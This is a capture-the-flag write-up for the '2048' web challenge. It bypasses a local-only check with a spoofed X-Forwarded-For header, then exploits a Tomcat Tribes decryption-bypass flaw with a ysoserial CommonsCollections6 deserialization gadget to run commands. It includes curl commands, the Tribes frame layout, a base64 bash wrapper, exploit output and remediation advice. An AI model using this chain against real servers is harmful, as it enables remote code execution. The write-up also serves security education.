# 2048

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Web |
| Challenge | 2048 |
| Description | Are you good @ 2048? |
| Endpoint | `http://91.107.164.78:8080/` |
| Flag | `ASIS{t0McAT_was_Th3_KEY}` |

## Executive Summary

The visible 2048 game was a distraction wrapped around an exposed Apache Tomcat
cluster receiver. Reconnaissance disclosed an internal diagnostics JSP through a
spoofable `X-Forwarded-For` check. That endpoint revealed Apache Tomcat 9.0.116,
an unauthenticated Tribes receiver on TCP port 4000, AES/CBC message encryption,
and Commons Collections 3.2.1 on the classpath.

Tomcat 9.0.116 is affected by CVE-2026-34486. Its `EncryptInterceptor` logs a
decryption failure but still forwards the original, unencrypted message to the
rest of the Tribes channel. A correctly framed plaintext `ChannelData` message
therefore reaches `GroupChannel`, where the body is passed to Java object
deserialization. A Commons Collections 6 gadget provides command execution as
the `citadel` user.

The command locates the two randomized, read-only flag fragments, concatenates
them into the world-writable shared directory, and retrieves the result through
the one-shot `/mirror.jsp` endpoint.

## 1. Initial Reconnaissance

The landing page serves a normal client-side implementation of 2048. Reviewing
the HTML and JavaScript reveals two tempting paths:

- The HTML contains `ASIS{lo0k_at_t41s_scr1pt_kiddi3}` in a comment.
- The game submits a player name, score, and either `grid-lock` or `portal-gun`
  to `/leaderboard.jsp`.

The first value is a staging-code decoy. Scores can be forged, but submitting a
winning score does not disclose the flag. The leaderboard is only an in-memory
score ledger.

The next useful discovery is `robots.txt`:

```text
User-agent: *
Disallow: /citadel/
Disallow: /citadel/lab-notes.html
Disallow: /admin/

# garage journal got swept last cycle.
# w-w-was there another door into the intranet? like a diagnostics thing?
```

The disallowed lab notebook at `/citadel/lab-notes.html` describes the complete
architecture in narrative form:

1. A gateway listens on TCP port 4000.
2. Messages use `AES/CBC/PKCS5Padding`.
3. Failed decryption does not stop downstream processing.
4. An old Commons Collections library unpacks messages.
5. Two randomized files under `/opt/citadel/vault` and `/opt/citadel/gate`
   contain the flag fragments.
6. Files written to `/opt/citadel/shared` can be downloaded once with
   `/mirror.jsp?parcel=<label>`.
7. A diagnostics console trusts proxy headers when deciding whether a request
   originated locally.

## 2. Accessing the Diagnostics Console

The notes state that the console lives in the same directory as `mirror.jsp`.
Requesting `/diagnostics.jsp` directly returns HTTP 403:

```bash
curl -i http://91.107.164.78:8080/diagnostics.jsp
```

Because the application trusts proxy metadata, supplying a loopback address in
`X-Forwarded-For` bypasses the local-only check:

```bash
curl -s \
  -H 'X-Forwarded-For: 127.0.0.1' \
  http://91.107.164.78:8080/diagnostics.jsp | jq
```

Important fields from the response are:

```json
{
  "server": "Apache Tomcat/9.0.116",
  "runningAs": "citadel",
  "classpathJars": [
    "catalina-ha.jar",
    "catalina-tribes.jar",
    "commons-collections-3.2.1.jar"
  ],
  "listeners": {
    "garageGateway": "tribes receiver tcp *:4000",
    "gatewayCipher": "AES/CBC/PKCS5Padding"
  }
}
```

The complete response is preserved in
[`artifacts/diagnostics.json`](artifacts/diagnostics.json).

## 3. Identifying the Tomcat Vulnerability

The disclosed version is the key. CVE-2026-34486 affects Tomcat 9.0.116 and
describes a bypass of the Tribes `EncryptInterceptor`.

In 9.0.116, the receive path is logically equivalent to:

```java
try {
    data = encryptionManager.decrypt(data);
    replaceMessage(data);
} catch (GeneralSecurityException e) {
    log.error("Failed to decrypt message", e);
}
super.messageReceived(msg);
```

The call to `super.messageReceived(msg)` occurs after the exception handler. If
decryption fails, `msg` still contains the attacker's original plaintext, and
that plaintext is forwarded.

Tomcat 9.0.117 fixes the issue by moving the forwarding call into the successful
decryption branch. A minimal source comparison is included in
[`artifacts/CVE-2026-34486.patch`](artifacts/CVE-2026-34486.patch).

This behavior means the encryption key is unnecessary. Sending an invalid AES
ciphertext deliberately triggers the exception, after which Tomcat processes
the original bytes.

## 4. Reconstructing a Tribes Message

TCP port 4000 does not accept a bare Java serialization stream. Tomcat's Tribes
receiver expects an `XByteBuffer` transport frame containing a serialized
`ChannelData` structure.

The outer frame is:

```text
"FLT2002" || uint32_be(channel_data_length) || channel_data || "TLF2003"
```

The relevant `ChannelData` fields are:

```text
uint32_be options
uint64_be timestamp
uint32_be unique_id_length
byte[]    unique_id
uint32_be member_length
byte[]    source_member
uint32_be message_length
byte[]    message
```

The source member is itself encoded using Tomcat's `MemberImpl` format and the
`TRIBES-B\x01\x00` / `TRIBES-E\x01\x00` markers.

The `options` field must be zero. If the `SEND_OPTIONS_BYTE_MESSAGE` bit
(`0x0001`) is set, Tomcat wraps the body as a `ByteMessage`. With the bit clear,
`GroupChannel.messageReceived()` instead calls `XByteBuffer.deserialize()` on
the message body, reaching `ObjectInputStream.readObject()`.

The packet construction is implemented in [`exploit.py`](exploit.py).

## 5. Building the Deserialization Gadget

Diagnostics disclosed `commons-collections-3.2.1.jar`, which supports the
classic Commons Collections gadget chains. The exploit uses ysoserial's
`CommonsCollections6` payload.

Download ysoserial 0.0.6:

```bash
curl -fL \
  https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar \
  -o ysoserial-all.jar
```

The remote command must avoid `Runtime.exec(String)` argument-splitting issues.
The exploit Base64-encodes the actual shell script and uses a whitespace-free
wrapper:

```text
bash -c {echo,<BASE64>}|{base64,-d}|{bash,-i}
```

The decoded script selects the randomized files while excluding the conspicuous
`README` and `flag.txt` decoys:

```bash
v=$(find /opt/citadel/vault -type f ! -name README ! -name flag.txt -print -quit)
g=$(find /opt/citadel/gate -type f -print -quit)
cat "$v" "$g" > /opt/citadel/shared/<random-label>
```

The output location is important. The process runs as `citadel`, so it can read
the root-owned fragments but cannot alter them. `/opt/citadel/shared` is
world-writable and exposed by the mirror JSP.

## 6. Executing the Exploit

Run the included exploit with Java and the ysoserial JAR available locally:

```bash
python3 exploit.py \
  --host 91.107.164.78 \
  --ysoserial ./ysoserial-all.jar
```

The script performs the following operations automatically:

1. Chooses a valid random parcel label.
2. Builds the remote fragment-recovery command.
3. Generates a Commons Collections 6 serialized object.
4. Wraps it in a valid Tribes `MemberImpl` and `ChannelData` packet.
5. Sends the plaintext packet to TCP port 4000.
6. Polls `/mirror.jsp?parcel=<label>` until the command output appears.
7. Prints the recovered flag.

Expected output:

```text
[+] generated 1562-byte CommonsCollections6 payload
[+] sent 1697-byte Tribes frame to 91.107.164.78:4000
[+] fetching one-shot parcel asis_2048_<random>
[+] recovered: ASIS{t0McAT_was_Th3_KEY}
```

## 7. Separating the Flag from the Decoys

Listing the protected directories after obtaining command execution showed:

```text
/opt/citadel/vault:
README                         27 bytes
flag.txt                       42 bytes
pf_9ba6bb1b7ff5.asc            15 bytes

/opt/citadel/gate:
launch_9d56e20cffbf.conf        9 bytes
```

Their contents were:

```text
README                       -> nothing to see here, Morty.
flag.txt                     -> ASIS{do_you_think_rick_sanchez_is_stupid?}
pf_9ba6bb1b7ff5.asc          -> ASIS{t0McAT_was
launch_9d56e20cffbf.conf     -> _Th3_KEY}
```

The obvious `flag.txt` is another decoy. The lab notes specifically identify the
files with randomized labels as the two launch-code halves. Concatenating those
files in vault-then-gate order produces the real flag.

## Flag

```text
ASIS{t0McAT_was_Th3_KEY}
```

## Remediation

The challenge combines three independent trust failures:

- Upgrade Tomcat to 9.0.117 or later so failed decryption terminates message
  processing.
- Do not expose the Tribes receiver to untrusted networks. Cluster membership
  and transport traffic should be restricted to authenticated peers on a
  private network.
- Accept forwarding headers only from known reverse proxies, and derive the
  client address from a trusted proxy configuration rather than a raw request
  header.

Removing Commons Collections 3.2.1 also eliminates the gadget used here, but it
does not make unauthenticated Java deserialization safe.

## References

- [NVD: CVE-2026-34486](https://nvd.nist.gov/vuln/detail/CVE-2026-34486)
- [Apache Tomcat 9.0.116 source archive](https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.116/src/)
- [Apache Tomcat Tribes introduction](https://tomcat.apache.org/tomcat-9.0-doc/tribes/introduction.html)
- [Apache Tomcat security model](https://tomcat.apache.org/security-model.html)
- [ysoserial](https://github.com/frohoff/ysoserial)
